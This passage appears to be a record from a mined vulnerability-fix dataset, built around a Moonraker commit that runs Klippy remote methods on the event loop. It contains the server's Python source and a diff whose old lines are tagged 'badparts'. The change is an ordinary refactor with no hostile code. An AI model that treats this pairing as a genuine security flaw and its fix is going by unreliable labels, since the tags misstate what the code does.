\"webhooks_sub\" not in self.init_list: temp_subs=self.all_subscriptions self.all_subscriptions={} try: await self.klippy_apis.subscribe_objects({'webhooks': None}) except ServerError as e: logging.info(f\"{e}\\nUnable to subscribe to webhooks object\") else: logging.info(\"Webhooks Subscribed\") self.init_list.append(\"webhooks_sub\") self.all_subscriptions.update(temp_subs) if \"gcode_output_sub\" not in self.init_list: try: await self.klippy_apis.subscribe_gcode_output() except ServerError as e: logging.info( f\"{e}\\nUnable to register gcode output subscription\") else: logging.info(\"GCode Output Subscribed\") self.init_list.append(\"gcode_output_sub\") if \"klippy_ready\" in self.init_list or \\ not self.klippy_connection.is_connected(): self.init_attempts=0 self.init_handle=None else: self.init_attempts +=1 self.init_handle=self.ioloop.call_later( INIT_TIME, self._initialize) async def _request_endpoints(self): result=await self.klippy_apis.list_endpoints(default=None) if result is None: return endpoints=result.get('endpoints',{}) for ep in endpoints: self.moonraker_app.register_remote_handler(ep) async def _check_ready(self): send_id=\"identified\" not in self.init_list try: result=await self.klippy_apis.get_klippy_info(send_id) except ServerError as e: if self.init_attempts % LOG_ATTEMPT_INTERVAL==0 and \\ self.init_attempts <=MAX_LOG_ATTEMPTS: logging.info( f\"{e}\\nKlippy info request error. This indicates that\\n\" f\"Klippy may have experienced an error during startup.\\n\" f\"Please check klippy.log for more information\") return if send_id: self.init_list.append(\"identified\") fixed_paths={k: result[k] for k in ['klipper_path', 'python_path', 'log_file', 'config_file']} file_manager=self.lookup_plugin('file_manager') file_manager.update_fixed_paths(fixed_paths) self.klippy_state=result.get('state', \"unknown\") if self.klippy_state==\"ready\": await self._verify_klippy_requirements() logging.info(\"Klippy ready\") self.init_list.append('klippy_ready') for method in self.klippy_reg_methods: try: await self.klippy_apis.register_method(method) except ServerError: logging.exception(f\"Unable to register method '{method}'\") self.send_event(\"server:klippy_ready\") elif self.init_attempts % LOG_ATTEMPT_INTERVAL==0 and \\ self.init_attempts <=MAX_LOG_ATTEMPTS: msg=result.get('state_message', \"Klippy Not Ready\") logging.info(\"\\n\" +msg) async def _verify_klippy_requirements(self): result=await self.klippy_apis.get_object_list(default=None) if result is None: logging.info( f\"Unable to retreive Klipper Object List\") return for name in list(self.all_subscriptions.keys()): if name not in result: del self.all_subscriptions[name] req_objs=set([\"virtual_sdcard\", \"display_status\", \"pause_resume\"]) missing_objs=req_objs -set(result) if missing_objs: err_str=\", \".join([f\"[{o}]\" for o in missing_objs]) logging.info( f\"\\nWarning, unable to detect the following printer \" f\"objects:\\n{err_str}\\nPlease add the the above sections \" f\"to printer.cfg for full Moonraker functionality.\") if \"virtual_sdcard\" not in missing_objs: result=await self.klippy_apis.query_objects( {'configfile': None}, default=None) if result is None: logging.info(f\"Unable to set SD Card path\") else: config=result.get('configfile',{}).get('config',{}) vsd_config=config.get('virtual_sdcard',{}) vsd_path=vsd_config.get('path', None) if vsd_path is not None: file_manager=self.lookup_plugin('file_manager') file_manager.register_directory('gcodes', vsd_path) else: logging.info( \"Configuration for[virtual_sdcard] not found,\" \" unable to set SD Card path\") def _process_gcode_response(self, response): self.send_event(\"server:gcode_response\", response) def _process_status_update(self, eventtime, status): if 'webhooks' in status: state=status['webhooks'].get('state', None) if state is not None: if state==\"shutdown\": logging.info(\"Klippy has shutdown\") self.send_event(\"server:klippy_shutdown\") self.klippy_state=state self.send_event(\"server:status_update\", status) async def make_request(self, rpc_method, params): if rpc_method==\"objects\/subscribe\": for obj, items in params.get('objects',{}).items(): if obj in self.all_subscriptions: pi=self.all_subscriptions[obj] if items is None or pi is None: self.all_subscriptions[obj]=None else: uitems=list(set(pi) | set(items)) self.all_subscriptions[obj]=uitems else: self.all_subscriptions[obj]=items params['objects']=dict(self.all_subscriptions) params['response_template']={'method': \"process_status_update\"} base_request=BaseRequest(rpc_method, params) self.pending_requests[base_request.id]=base_request self.ioloop.spawn_callback( self.klippy_connection.send_request, base_request) result=await base_request.wait() return result async def _stop_server(self): self.server_running=False for name, plugin in self.plugins.items(): if hasattr(plugin, \"close\"): ret=plugin.close() if asyncio.iscoroutine(ret): await ret self.klippy_connection.close() while self.klippy_state !=\"disconnected\": await gen.sleep(.1) await self.moonraker_app.close() self.ioloop.stop() async def _handle_server_restart(self, path, method, args): self.ioloop.spawn_callback(self._stop_server) return \"ok\" async def _handle_info_request(self, path, method, args): return{ 'klippy_connected': self.klippy_connection.is_connected(), 'klippy_state': self.klippy_state, 'plugins': list(self.plugins.keys())} class KlippyConnection: def __init__(self, on_recd, on_close): self.ioloop=IOLoop.current() self.iostream=None self.on_recd=on_recd self.on_close=on_close async def connect(self, address): ksock=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) kstream=iostream.IOStream(ksock) try: await kstream.connect(address) except iostream.StreamClosedError: return False logging.info(\"Klippy Connection Established\") self.iostream=kstream self.iostream.set_close_callback(self.on_close) self.ioloop.spawn_callback(self._read_stream, self.iostream) return True async def _read_stream(self, stream): while not stream.closed(): try: data=await stream.read_until(b'\\x03') except iostream.StreamClosedError as e: return except Exception: logging.exception(\"Klippy Stream Read Error\") continue try: decoded_cmd=json.loads(data[:-1]) self.on_recd(decoded_cmd) except Exception: logging.exception( f\"Error processing Klippy Host Response:{data.decode()}\") async def send_request(self, request): if self.iostream is None: request.notify(ServerError(\"Klippy Host not connected\", 503)) return data=json.dumps(request.to_dict()).encode() +b\"\\x03\" try: await self.iostream.write(data) except iostream.StreamClosedError: request.notify(ServerError(\"Klippy Host not connected\", 503)) def is_connected(self): return self.iostream is not None and not self.iostream.closed() def close(self): if self.iostream is not None and \\ not self.iostream.closed(): self.iostream.close() class BaseRequest: def __init__(self, rpc_method, params): self.id=id(self) self.rpc_method=rpc_method self.params=params self._event=Event() self.response=None async def wait(self): start_time=time.time() while True: timeout=time.time() +60. try: await self._event.wait(timeout=timeout) except TimeoutError: pending_time=time.time() -start_time logging.info( f\"Request '{self.rpc_method}' pending: \" f\"{pending_time:.2f} seconds\") self._event.clear() continue break if isinstance(self.response, ServerError): raise self.response return self.response def notify(self, response): self.response=response self._event.set() def to_dict(self): return{'id': self.id, 'method': self.rpc_method, 'params': self.params} def main(): parser=argparse.ArgumentParser( description=\"Moonraker -Klipper API Server\") parser.add_argument( \"-c\", \"--configfile\", default=\"~\/moonraker.conf\", metavar='<configfile>', help=\"Location of moonraker configuration file\") parser.add_argument( \"-l\", \"--logfile\", default=\"\/tmp\/moonraker.log\", metavar='<logfile>', help=\"log file name and location\") cmd_line_args=parser.parse_args() log_file=os.path.normpath(os.path.expanduser(cmd_line_args.logfile)) cmd_line_args.logfile=log_file ql=utils.setup_logging(log_file) if sys.version_info <(3, 7): msg=f\"Moonraker requires Python 3.7 or above. \" \\ f\"Detected Version:{sys.version}\" logging.info(msg) print(msg) ql.stop() exit(1) io_loop=IOLoop.current() estatus=0 while True: try: server=Server(cmd_line_args) except Exception: logging.exception(\"Moonraker Error\") estatus=1 break try: server.start() io_loop.start() except Exception: logging.exception(\"Server Running Error\") estatus=1 break time.sleep(.5) logging.info(\"Attempting Server Restart...\") io_loop.close(True) logging.info(\"Server Shutdown\") ql.stop() exit(estatus) if __name__=='__main__': main() ","sourceWithComments":"# Moonraker - HTTP\/Websocket API Server for Klipper\n#\n# Copyright (C) 2020 Eric Callahan <arksine.code@gmail.com>\n#\n# This file may be distributed under the terms of the GNU GPLv3 license\nimport argparse\nimport sys\nimport importlib\nimport os\nimport time\nimport socket\nimport logging\nimport json\nimport confighelper\nimport utils\nimport asyncio\nfrom tornado import iostream, gen\nfrom tornado.ioloop import IOLoop\nfrom tornado.util import TimeoutError\nfrom tornado.locks import Event\nfrom app import MoonrakerApp\nfrom utils import ServerError\n\nINIT_TIME = .25\nLOG_ATTEMPT_INTERVAL = int(2. \/ INIT_TIME + .5)\nMAX_LOG_ATTEMPTS = 10 * LOG_ATTEMPT_INTERVAL\n\nCORE_PLUGINS = [\n    'file_manager', 'klippy_apis', 'machine',\n    'data_store', 'shell_command']\n\nclass Sentinel:\n    pass\n\nclass Server:\n    error = ServerError\n    def __init__(self, args):\n        config = confighelper.get_configuration(self, args)\n        self.host = config.get('host', \"0.0.0.0\")\n        self.port = config.getint('port', 7125)\n\n        # Event initialization\n        self.events = {}\n\n        # Klippy Connection Handling\n        self.klippy_address = config.get(\n            'klippy_uds_address', \"\/tmp\/klippy_uds\")\n        self.klippy_connection = KlippyConnection(\n            self.process_command, self.on_connection_closed)\n        self.init_list = []\n        self.init_handle = None\n        self.init_attempts = 0\n        self.klippy_state = \"disconnected\"\n\n        # XXX - currently moonraker maintains a superset of all\n        # subscriptions, the results of which are forwarded to all\n        # connected websockets. A better implementation would open a\n        # unique unix domain socket for each websocket client and\n        # allow Klipper to forward only those subscriptions back to\n        # correct client.\n        self.all_subscriptions = {}\n\n        # Server\/IOLoop\n        self.server_running = False\n        self.moonraker_app = app = MoonrakerApp(config)\n        self.register_endpoint = app.register_local_handler\n        self.register_static_file_handler = app.register_static_file_handler\n        self.register_upload_handler = app.register_upload_handler\n        self.ioloop = IOLoop.current()\n\n        self.register_endpoint(\n            \"\/server\/info\", ['GET'], self._handle_info_request)\n        self.register_endpoint(\n            \"\/server\/restart\", ['POST'], self._handle_server_restart)\n\n        # Setup remote methods accessable to Klippy.  Note that all\n        # registered remote methods should be of the notification type,\n        # they do not return a response to Klippy after execution\n        self.pending_requests = {}\n        self.remote_methods = {}\n        self.klippy_reg_methods = []\n        self.register_remote_method(\n            'process_gcode_response', self._process_gcode_response,\n            need_klippy_reg=False)\n        self.register_remote_method(\n            'process_status_update', self._process_status_update,\n            need_klippy_reg=False)\n\n        # Plugin initialization\n        self.plugins = {}\n        self.klippy_apis = self.load_plugin(config, 'klippy_apis')\n        self._load_plugins(config)\n\n    def start(self):\n        hostname, hostport = self.get_host_info()\n        logging.info(\n            f\"Starting Moonraker on ({self.host}, {hostport}), \"\n            f\"Hostname: {hostname}\")\n        self.moonraker_app.listen(self.host, self.port)\n        self.server_running = True\n        self.ioloop.spawn_callback(self._connect_klippy)\n\n    # ***** Plugin Management *****\n    def _load_plugins(self, config):\n        # load core plugins\n        for plugin in CORE_PLUGINS:\n            self.load_plugin(config, plugin)\n\n        # check for optional plugins\n        opt_sections = set(config.sections()) - \\\n            set(['server', 'authorization', 'cmd_args'])\n        for section in opt_sections:\n            self.load_plugin(config, section, None)\n\n    def load_plugin(self, config, plugin_name, default=Sentinel):\n        if plugin_name in self.plugins:\n            return self.plugins[plugin_name]\n        # Make sure plugin exists\n        mod_path = os.path.join(\n            os.path.dirname(__file__), 'plugins', plugin_name + '.py')\n        if not os.path.exists(mod_path):\n            msg = f\"Plugin ({plugin_name}) does not exist\"\n            logging.info(msg)\n            if default == Sentinel:\n                raise ServerError(msg)\n            return default\n        module = importlib.import_module(\"plugins.\" + plugin_name)\n        try:\n            if plugin_name not in CORE_PLUGINS:\n                config = config[plugin_name]\n            load_func = getattr(module, \"load_plugin\")\n            plugin = load_func(config)\n        except Exception:\n            msg = f\"Unable to load plugin ({plugin_name})\"\n            logging.exception(msg)\n            if default == Sentinel:\n                raise ServerError(msg)\n            return default\n        self.plugins[plugin_name] = plugin\n        logging.info(f\"Plugin ({plugin_name}) loaded\")\n        return plugin\n\n    def lookup_plugin(self, plugin_name, default=Sentinel):\n        plugin = self.plugins.get(plugin_name, default)\n        if plugin == Sentinel:\n            raise ServerError(f\"Plugin ({plugin_name}) not found\")\n        return plugin\n\n    def register_event_handler(self, event, callback):\n        self.events.setdefault(event, []).append(callback)\n\n    def send_event(self, event, *args):\n        events = self.events.get(event, [])\n        for evt in events:\n            self.ioloop.spawn_callback(evt, *args)\n\n    def register_remote_method(self, method_name, cb, need_klippy_reg=True):\n        if method_name in self.remote_methods:\n            # XXX - may want to raise an exception here\n            logging.info(f\"Remote method ({method_name}) already registered\")\n            return\n        self.remote_methods[method_name] = cb\n        if need_klippy_reg:\n            # These methods need to be registered with Klippy\n            self.klippy_reg_methods.append(method_name)\n\n    def get_host_info(self):\n        hostname = socket.gethostname()\n        return hostname, self.port\n\n    # ***** Klippy Connection *****\n    async def _connect_klippy(self):\n        if not self.server_running:\n            return\n        ret = await self.klippy_connection.connect(self.klippy_address)\n        if not ret:\n            self.ioloop.call_later(.25, self._connect_klippy)\n            return\n        # begin server iniialization\n        self.ioloop.spawn_callback(self._initialize)\n\n    def process_command(self, cmd):\n        method = cmd.get('method', None)\n        if method is not None:\n            # This is a remote method called from klippy\n            cb = self.remote_methods.get(method, None)\n            if cb is not None:\n                params = cmd.get('params', {})\n                cb(**params)\n            else:\n                logging.info(f\"Unknown method received: {method}\")\n            return\n        # This is a response to a request, process\n        req_id = cmd.get('id', None)\n        request = self.pending_requests.pop(req_id, None)\n        if request is None:\n            logging.info(\n                f\"No request matching request ID: {req_id}, \"\n                f\"response: {cmd}\")\n            return\n        if 'result' in cmd:\n            result = cmd['result']\n            if not result:\n                result = \"ok\"\n        else:\n            err = cmd.get('error', \"Malformed Klippy Response\")\n            result = ServerError(err, 400)\n        request.notify(result)\n\n    def on_connection_closed(self):\n        self.init_list = []\n        self.klippy_state = \"disconnected\"\n        for request in self.pending_requests.values():\n            request.notify(ServerError(\"Klippy Disconnected\", 503))\n        self.pending_requests = {}\n        logging.info(\"Klippy Connection Removed\")\n        self.send_event(\"server:klippy_disconnect\")\n        if self.init_handle is not None:\n            self.ioloop.remove_timeout(self.init_handle)\n        if self.server_running:\n            self.ioloop.call_later(.25, self._connect_klippy)\n\n    async def _initialize(self):\n        if not self.server_running:\n            return\n        await self._check_ready()\n        await self._request_endpoints()\n        # Subscribe to \"webhooks\"\n        # Register \"webhooks\" subscription\n        if \"webhooks_sub\" not in self.init_list:\n            temp_subs = self.all_subscriptions\n            self.all_subscriptions = {}\n            try:\n                await self.klippy_apis.subscribe_objects({'webhooks': None})\n            except ServerError as e:\n                logging.info(f\"{e}\\nUnable to subscribe to webhooks object\")\n            else:\n                logging.info(\"Webhooks Subscribed\")\n                self.init_list.append(\"webhooks_sub\")\n            self.all_subscriptions.update(temp_subs)\n        # Subscribe to Gcode Output\n        if \"gcode_output_sub\" not in self.init_list:\n            try:\n                await self.klippy_apis.subscribe_gcode_output()\n            except ServerError as e:\n                logging.info(\n                    f\"{e}\\nUnable to register gcode output subscription\")\n            else:\n                logging.info(\"GCode Output Subscribed\")\n                self.init_list.append(\"gcode_output_sub\")\n        if \"klippy_ready\" in self.init_list or \\\n                not self.klippy_connection.is_connected():\n            # Either Klippy is ready or the connection dropped\n            # during initialization.  Exit initialization\n            self.init_attempts = 0\n            self.init_handle = None\n        else:\n            self.init_attempts += 1\n            self.init_handle = self.ioloop.call_later(\n                INIT_TIME, self._initialize)\n\n    async def _request_endpoints(self):\n        result = await self.klippy_apis.list_endpoints(default=None)\n        if result is None:\n            return\n        endpoints = result.get('endpoints', {})\n        for ep in endpoints:\n            self.moonraker_app.register_remote_handler(ep)\n\n    async def _check_ready(self):\n        send_id = \"identified\" not in self.init_list\n        try:\n            result = await self.klippy_apis.get_klippy_info(send_id)\n        except ServerError as e:\n            if self.init_attempts % LOG_ATTEMPT_INTERVAL == 0 and \\\n                    self.init_attempts <= MAX_LOG_ATTEMPTS:\n                logging.info(\n                    f\"{e}\\nKlippy info request error.  This indicates that\\n\"\n                    f\"Klippy may have experienced an error during startup.\\n\"\n                    f\"Please check klippy.log for more information\")\n            return\n        if send_id:\n            self.init_list.append(\"identified\")\n        # Update filemanager fixed paths\n        fixed_paths = {k: result[k] for k in\n                       ['klipper_path', 'python_path',\n                        'log_file', 'config_file']}\n        file_manager = self.lookup_plugin('file_manager')\n        file_manager.update_fixed_paths(fixed_paths)\n        self.klippy_state = result.get('state', \"unknown\")\n        if self.klippy_state == \"ready\":\n            await self._verify_klippy_requirements()\n            logging.info(\"Klippy ready\")\n            self.init_list.append('klippy_ready')\n            # register methods with klippy\n            for method in self.klippy_reg_methods:\n                try:\n                    await self.klippy_apis.register_method(method)\n                except ServerError:\n                    logging.exception(f\"Unable to register method '{method}'\")\n            self.send_event(\"server:klippy_ready\")\n        elif self.init_attempts % LOG_ATTEMPT_INTERVAL == 0 and \\\n                self.init_attempts <= MAX_LOG_ATTEMPTS:\n            msg = result.get('state_message', \"Klippy Not Ready\")\n            logging.info(\"\\n\" + msg)\n\n    async def _verify_klippy_requirements(self):\n        result = await self.klippy_apis.get_object_list(default=None)\n        if result is None:\n            logging.info(\n                f\"Unable to retreive Klipper Object List\")\n            return\n        # Remove stale objects from the persistent subscription dict\n        for name in list(self.all_subscriptions.keys()):\n            if name not in result:\n                del self.all_subscriptions[name]\n        req_objs = set([\"virtual_sdcard\", \"display_status\", \"pause_resume\"])\n        missing_objs = req_objs - set(result)\n        if missing_objs:\n            err_str = \", \".join([f\"[{o}]\" for o in missing_objs])\n            logging.info(\n                f\"\\nWarning, unable to detect the following printer \"\n                f\"objects:\\n{err_str}\\nPlease add the the above sections \"\n                f\"to printer.cfg for full Moonraker functionality.\")\n        if \"virtual_sdcard\" not in missing_objs:\n            # Update the gcode path\n            result = await self.klippy_apis.query_objects(\n                {'configfile': None}, default=None)\n            if result is None:\n                logging.info(f\"Unable to set SD Card path\")\n            else:\n                config = result.get('configfile', {}).get('config', {})\n                vsd_config = config.get('virtual_sdcard', {})\n                vsd_path = vsd_config.get('path', None)\n                if vsd_path is not None:\n                    file_manager = self.lookup_plugin('file_manager')\n                    file_manager.register_directory('gcodes', vsd_path)\n                else:\n                    logging.info(\n                        \"Configuration for [virtual_sdcard] not found,\"\n                        \" unable to set SD Card path\")\n\n    def _process_gcode_response(self, response):\n        self.send_event(\"server:gcode_response\", response)\n\n    def _process_status_update(self, eventtime, status):\n        if 'webhooks' in status:\n            # XXX - process other states (startup, ready, error, etc)?\n            state = status['webhooks'].get('state', None)\n            if state is not None:\n                if state == \"shutdown\":\n                    logging.info(\"Klippy has shutdown\")\n                    self.send_event(\"server:klippy_shutdown\")\n                self.klippy_state = state\n        self.send_event(\"server:status_update\", status)\n\n    async def make_request(self, rpc_method, params):\n        # XXX - This adds the \"response_template\" to a subscription\n        # request and tracks all subscriptions so that each\n        # client gets what its requesting.  In the future we should\n        # track subscriptions per client and send clients only\n        # the data they are asking for.\n        if rpc_method == \"objects\/subscribe\":\n            for obj, items in params.get('objects', {}).items():\n                if obj in self.all_subscriptions:\n                    pi = self.all_subscriptions[obj]\n                    if items is None or pi is None:\n                        self.all_subscriptions[obj] = None\n                    else:\n                        uitems = list(set(pi) | set(items))\n                        self.all_subscriptions[obj] = uitems\n                else:\n                    self.all_subscriptions[obj] = items\n            params['objects'] = dict(self.all_subscriptions)\n            params['response_template'] = {'method': \"process_status_update\"}\n\n        base_request = BaseRequest(rpc_method, params)\n        self.pending_requests[base_request.id] = base_request\n        self.ioloop.spawn_callback(\n            self.klippy_connection.send_request, base_request)\n        result = await base_request.wait()\n        return result\n\n    async def _stop_server(self):\n        self.server_running = False\n        for name, plugin in self.plugins.items():\n            if hasattr(plugin, \"close\"):\n                ret = plugin.close()\n                if asyncio.iscoroutine(ret):\n                    await ret\n        self.klippy_connection.close()\n        while self.klippy_state != \"disconnected\":\n            await gen.sleep(.1)\n        await self.moonraker_app.close()\n        self.ioloop.stop()\n\n    async def _handle_server_restart(self, path, method, args):\n        self.ioloop.spawn_callback(self._stop_server)\n        return \"ok\"\n\n    async def _handle_info_request(self, path, method, args):\n        return {\n            'klippy_connected': self.klippy_connection.is_connected(),\n            'klippy_state': self.klippy_state,\n            'plugins': list(self.plugins.keys())}\n\nclass KlippyConnection:\n    def __init__(self, on_recd, on_close):\n        self.ioloop = IOLoop.current()\n        self.iostream = None\n        self.on_recd = on_recd\n        self.on_close = on_close\n\n    async def connect(self, address):\n        ksock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n        kstream = iostream.IOStream(ksock)\n        try:\n            await kstream.connect(address)\n        except iostream.StreamClosedError:\n            return False\n        logging.info(\"Klippy Connection Established\")\n        self.iostream = kstream\n        self.iostream.set_close_callback(self.on_close)\n        self.ioloop.spawn_callback(self._read_stream, self.iostream)\n        return True\n\n    async def _read_stream(self, stream):\n        while not stream.closed():\n            try:\n                data = await stream.read_until(b'\\x03')\n            except iostream.StreamClosedError as e:\n                return\n            except Exception:\n                logging.exception(\"Klippy Stream Read Error\")\n                continue\n            try:\n                decoded_cmd = json.loads(data[:-1])\n                self.on_recd(decoded_cmd)\n            except Exception:\n                logging.exception(\n                    f\"Error processing Klippy Host Response: {data.decode()}\")\n\n    async def send_request(self, request):\n        if self.iostream is None:\n            request.notify(ServerError(\"Klippy Host not connected\", 503))\n            return\n        data = json.dumps(request.to_dict()).encode() + b\"\\x03\"\n        try:\n            await self.iostream.write(data)\n        except iostream.StreamClosedError:\n            request.notify(ServerError(\"Klippy Host not connected\", 503))\n\n    def is_connected(self):\n        return self.iostream is not None and not self.iostream.closed()\n\n    def close(self):\n        if self.iostream is not None and \\\n                not self.iostream.closed():\n            self.iostream.close()\n\n# Basic WebRequest class, easily converted to dict for json encoding\nclass BaseRequest:\n    def __init__(self, rpc_method, params):\n        self.id = id(self)\n        self.rpc_method = rpc_method\n        self.params = params\n        self._event = Event()\n        self.response = None\n\n    async def wait(self):\n        # Log pending requests every 60 seconds\n        start_time = time.time()\n        while True:\n            timeout = time.time() + 60.\n            try:\n                await self._event.wait(timeout=timeout)\n            except TimeoutError:\n                pending_time = time.time() - start_time\n                logging.info(\n                    f\"Request '{self.rpc_method}' pending: \"\n                    f\"{pending_time:.2f} seconds\")\n                self._event.clear()\n                continue\n            break\n        if isinstance(self.response, ServerError):\n            raise self.response\n        return self.response\n\n    def notify(self, response):\n        self.response = response\n        self._event.set()\n\n    def to_dict(self):\n        return {'id': self.id, 'method': self.rpc_method,\n                'params': self.params}\n\ndef main():\n    # Parse start arguments\n    parser = argparse.ArgumentParser(\n        description=\"Moonraker - Klipper API Server\")\n    parser.add_argument(\n        \"-c\", \"--configfile\", default=\"~\/moonraker.conf\",\n        metavar='<configfile>',\n        help=\"Location of moonraker configuration file\")\n    parser.add_argument(\n        \"-l\", \"--logfile\", default=\"\/tmp\/moonraker.log\", metavar='<logfile>',\n        help=\"log file name and location\")\n    cmd_line_args = parser.parse_args()\n\n    # Setup Logging\n    log_file = os.path.normpath(os.path.expanduser(cmd_line_args.logfile))\n    cmd_line_args.logfile = log_file\n    ql = utils.setup_logging(log_file)\n\n    if sys.version_info < (3, 7):\n        msg = f\"Moonraker requires Python 3.7 or above.  \" \\\n            f\"Detected Version: {sys.version}\"\n        logging.info(msg)\n        print(msg)\n        ql.stop()\n        exit(1)\n\n    # Start IOLoop and Server\n    io_loop = IOLoop.current()\n    estatus = 0\n    while True:\n        try:\n            server = Server(cmd_line_args)\n        except Exception:\n            logging.exception(\"Moonraker Error\")\n            estatus = 1\n            break\n        try:\n            server.start()\n            io_loop.start()\n        except Exception:\n            logging.exception(\"Server Running Error\")\n            estatus = 1\n            break\n        # Since we are running outside of the the server\n        # it is ok to use a blocking sleep here\n        time.sleep(.5)\n        logging.info(\"Attempting Server Restart...\")\n    io_loop.close(True)\n    logging.info(\"Server Shutdown\")\n    ql.stop()\n    exit(estatus)\n\n\nif __name__ == '__main__':\n    main()\n"}},"msg":"moonraker:  spawn remote methods on the event loop\n\nThis allows regsitered methods to be coroutines.  Execution is done on the event loop to prevent a coroutine from blocking the incoming command queue.\n\nSigned-off-by:  Eric Callahan <arksine.code@gmail.com>"}},"https:\/\/github.com\/Arksine\/moonraker":{"6dfab37ef856fade2839dd0315db4f2d25284947":{"url":"https:\/\/api.github.com\/repos\/Arksine\/moonraker\/commits\/6dfab37ef856fade2839dd0315db4f2d25284947","html_url":"https:\/\/github.com\/Arksine\/moonraker\/commit\/6dfab37ef856fade2839dd0315db4f2d25284947","message":"moonraker:  spawn remote methods on the event loop\n\nThis allows regsitered methods to be coroutines.  Execution is done on the event loop to prevent a coroutine from blocking the incoming command queue.\n\nSigned-off-by:  Eric Callahan <arksine.code@gmail.com>","sha":"6dfab37ef856fade2839dd0315db4f2d25284947","keyword":"remote code execution prevent","diff":"diff --git a\/moonraker\/moonraker.py b\/moonraker\/moonraker.py\nindex e4386025..7e0a9edd 100644\n--- a\/moonraker\/moonraker.py\n+++ b\/moonraker\/moonraker.py\n@@ -183,10 +183,10 @@ def process_command(self, cmd):\n         method = cmd.get('method', None)\n         if method is not None:\n             # This is a remote method called from klippy\n-            cb = self.remote_methods.get(method, None)\n-            if cb is not None:\n+            if method in self.remote_methods:\n                 params = cmd.get('params', {})\n-                cb(**params)\n+                self.ioloop.spawn_callback(\n+                    self._execute_method, method, **params)\n             else:\n                 logging.info(f\"Unknown method received: {method}\")\n             return\n@@ -207,6 +207,14 @@ def process_command(self, cmd):\n             result = ServerError(err, 400)\n         request.notify(result)\n \n+    async def _execute_method(self, method_name, **kwargs):\n+        try:\n+            ret = self.remote_methods[method_name](**kwargs)\n+            if asyncio.iscoroutine(ret):\n+                await ret\n+        except Exception:\n+            logging.exception(f\"Error running remote method: {method_name}\")\n+\n     def on_connection_closed(self):\n         self.init_list = []\n         self.klippy_state = \"disconnected\"\n","files":{"\/moonraker\/moonraker.py":{"changes":[{"diff":"\n         method = cmd.get('method', None)\n         if method is not None:\n             # This is a remote method called from klippy\n-            cb = self.remote_methods.get(method, None)\n-            if cb is not None:\n+            if method in self.remote_methods:\n                 params = cmd.get('params', {})\n-                cb(**params)\n+                self.ioloop.spawn_callback(\n+                    self._execute_method, method, **params)\n             else:\n                 logging.info(f\"Unknown method received: {method}\")\n             return\n","add":3,"remove":3,"filename":"\/moonraker\/moonraker.py","badparts":["            cb = self.remote_methods.get(method, None)","            if cb is not None:","                cb(**params)"],"goodparts":["            if method in self.remote_methods:","                self.ioloop.spawn_callback(","                    self._execute_method, method, **params)"]},{"diff":"\n         method = cmd.get('method', None)\n         if method is not None:\n             # This is a remote method called from klippy\n-            cb = self.remote_methods.get(method, None)\n-            if cb is not None:\n+            if method in self.remote_methods:\n                 params = cmd.get('params', {})\n-                cb(**params)\n+                self.ioloop.spawn_callback(\n+                    self._execute_method, method, **params)\n             else:\n                 logging.info(f\"Unknown method received: {method}\")\n             return\n","add":3,"remove":3,"filename":"\/moonraker\/moonraker.py","badparts":["            cb = self.remote_methods.get(method, None)","            if cb is not None:","                cb(**params)"],"goodparts":["            if method in self.remote_methods:","                self.ioloop.spawn_callback(","                    self._execute_method, method, **params)"]}],"source":"\n import argparse import sys import importlib import os import time import socket import logging import json import confighelper import utils import asyncio from tornado import iostream, gen from tornado.ioloop import IOLoop from tornado.util import TimeoutError from tornado.locks import Event from app import MoonrakerApp from utils import ServerError INIT_TIME=.25 LOG_ATTEMPT_INTERVAL=int(2. \/ INIT_TIME +.5) MAX_LOG_ATTEMPTS=10 * LOG_ATTEMPT_INTERVAL CORE_PLUGINS=[ 'file_manager', 'klippy_apis', 'machine', 'data_store', 'shell_command'] class Sentinel: pass class Server: error=ServerError def __init__(self, args): config=confighelper.get_configuration(self, args) self.host=config.get('host', \"0.0.0.0\") self.port=config.getint('port', 7125) self.events={} self.klippy_address=config.get( 'klippy_uds_address', \"\/tmp\/klippy_uds\") self.klippy_connection=KlippyConnection( self.process_command, self.on_connection_closed) self.init_list=[] self.init_handle=None self.init_attempts=0 self.klippy_state=\"disconnected\" self.all_subscriptions={} self.server_running=False self.moonraker_app=app=MoonrakerApp(config) self.register_endpoint=app.register_local_handler self.register_static_file_handler=app.register_static_file_handler self.register_upload_handler=app.register_upload_handler self.ioloop=IOLoop.current() self.register_endpoint( \"\/server\/info\",['GET'], self._handle_info_request) self.register_endpoint( \"\/server\/restart\",['POST'], self._handle_server_restart) self.pending_requests={} self.remote_methods={} self.klippy_reg_methods=[] self.register_remote_method( 'process_gcode_response', self._process_gcode_response, need_klippy_reg=False) self.register_remote_method( 'process_status_update', self._process_status_update, need_klippy_reg=False) self.plugins={} self.klippy_apis=self.load_plugin(config, 'klippy_apis') self._load_plugins(config) def start(self): hostname, hostport=self.get_host_info() logging.info( f\"Starting Moonraker on({self.host},{hostport}), \" f\"Hostname:{hostname}\") self.moonraker_app.listen(self.host, self.port) self.server_running=True self.ioloop.spawn_callback(self._connect_klippy) def _load_plugins(self, config): for plugin in CORE_PLUGINS: self.load_plugin(config, plugin) opt_sections=set(config.sections()) -\\ set(['server', 'authorization', 'cmd_args']) for section in opt_sections: self.load_plugin(config, section, None) def load_plugin(self, config, plugin_name, default=Sentinel): if plugin_name in self.plugins: return self.plugins[plugin_name] mod_path=os.path.join( os.path.dirname(__file__), 'plugins', plugin_name +'.py') if not os.path.exists(mod_path): msg=f\"Plugin({plugin_name}) does not exist\" logging.info(msg) if default==Sentinel: raise ServerError(msg) return default module=importlib.import_module(\"plugins.\" +plugin_name) try: if plugin_name not in CORE_PLUGINS: config=config[plugin_name] load_func=getattr(module, \"load_plugin\") plugin=load_func(config) except Exception: msg=f\"Unable to load plugin({plugin_name})\" logging.exception(msg) if default==Sentinel: raise ServerError(msg) return default self.plugins[plugin_name]=plugin logging.info(f\"Plugin({plugin_name}) loaded\") return plugin def lookup_plugin(self, plugin_name, default=Sentinel): plugin=self.plugins.get(plugin_name, default) if plugin==Sentinel: raise ServerError(f\"Plugin({plugin_name}) not found\") return plugin def register_event_handler(self, event, callback): self.events.setdefault(event,[]).append(callback) def send_event(self, event, *args): events=self.events.get(event,[]) for evt in events: self.ioloop.spawn_callback(evt, *args) def register_remote_method(self, method_name, cb, need_klippy_reg=True): if method_name in self.remote_methods: logging.info(f\"Remote method({method_name}) already registered\") return self.remote_methods[method_name]=cb if need_klippy_reg: self.klippy_reg_methods.append(method_name) def get_host_info(self): hostname=socket.gethostname() return hostname, self.port async def _connect_klippy(self): if not self.server_running: return ret=await 